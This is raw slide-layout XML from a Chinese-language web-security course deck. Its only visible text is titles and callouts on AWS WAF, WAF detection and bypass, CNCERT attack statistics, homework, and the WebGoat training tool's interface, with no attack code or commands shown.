        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3887788" y="4649152"/>
            <a:ext cx="3048000" cy="2225994"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="图片 8"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6956426" y="4639942"/>
            <a:ext cx="2222500" cy="1852133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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5800" y="1340803"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>AWS WAF</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>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0" y="2249805"/>
            <a:ext cx="9144000" cy="363855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WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的安全性</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="439738" y="1234440"/>
            <a:ext cx="8210550" cy="51816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WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的安全性</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1150938" y="1401763"/>
            <a:ext cx="6581775" cy="44196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如何探测、绕过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="444500" y="1360517"/>
            <a:ext cx="8201025" cy="3505200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="911224" y="1101725"/>
            <a:ext cx="7267575" cy="5362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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>本章小结</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="476163" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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nodePh="1">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:endCondLst>
                                    <p:cond evt="begin" delay="0">
                                      <p:tn val="5"/>
                                    </p:cond>
                                  </p:endCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="6" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="476163">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4761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616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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>作业</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95236"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95237" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="1352550"/>
            <a:ext cx="7553325" cy="4705350"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="28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494547" y="2778334"/>
            <a:ext cx="5542547" cy="1301332"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>参考资料</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4400"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6339549" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>一、网站攻击态势（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CNCERT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>）</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883084" y="1677122"/>
            <a:ext cx="6991350" cy="4324350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482943" y="389516"/>
            <a:ext cx="5264222" cy="625619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="911225" y="1658938"/>
            <a:ext cx="7267575" cy="4010025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482943" y="389516"/>
            <a:ext cx="5264222" cy="625619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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877888" y="1554163"/>
            <a:ext cx="7334250" cy="4400550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482943" y="389516"/>
            <a:ext cx="5264222" cy="625619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="492125" y="1839624"/>
            <a:ext cx="8105775" cy="4010025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482943" y="389516"/>
            <a:ext cx="5264222" cy="625619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="715963" y="1668463"/>
            <a:ext cx="7715250" cy="3886200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482943" y="389516"/>
            <a:ext cx="5264222" cy="625619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solid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6339549" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>二、网站攻击学习工具</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a:xfrm>
            <a:off x="1184593" y="-8572"/>
            <a:ext cx="7793037" cy="958850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>跟着</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>WebGoat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>一起学习</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="440325" name="Picture 5" descr="snap"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="725488" y="925513"/>
            <a:ext cx="8167687" cy="5680075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440326" name="AutoShape 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="5157788"/>
            <a:ext cx="1223962" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -54412"/>
              <a:gd name="adj2" fmla="val -116005"/>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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>各种攻击方法选择</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440327" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755650" y="2276475"/>
            <a:ext cx="1727200" cy="935038"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 75278"/>
              <a:gd name="adj2" fmla="val 4838"/>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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>提示对各种类型漏洞应使用的漏洞攻击程序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440328" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2555875" y="3357563"/>
            <a:ext cx="1727200" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 25644"/>
              <a:gd name="adj2" fmla="val -121301"/>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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>显示页面各种隐藏的参数值</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440329" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3419475" y="1412875"/>
            <a:ext cx="1727200" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 30606"/>
              <a:gd name="adj2" fmla="val 110486"/>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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>显示页面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>值</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440330" name="AutoShape 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="3429000"/>
            <a:ext cx="1727200" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4690"/>
              <a:gd name="adj2" fmla="val -123954"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>漏洞和攻击方法的课程学习计划</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440331" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6156325" y="1412875"/>
            <a:ext cx="1439863" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -30046"/>
              <a:gd name="adj2" fmla="val 117106"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="89999"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512" anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>显示页面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>源代码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="00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25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="440325"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4403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440326"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44032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440327"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="440327"/>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440328"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="440328"/>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8" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="440329"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44032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440330"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4403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8" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="440331"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="440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6" grpId="0" animBg="1"/>
      <p:bldP spid="440327" grpId="0" animBg="1"/>
      <p:bldP spid="440328" grpId="0" animBg="1"/>
      <p:bldP spid="440329" grpId="0" animBg="1"/>
      <p:bldP spid="440330" grpId="0" animBg="1"/>
      <p:bldP spid="440331"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跟着</a:t>
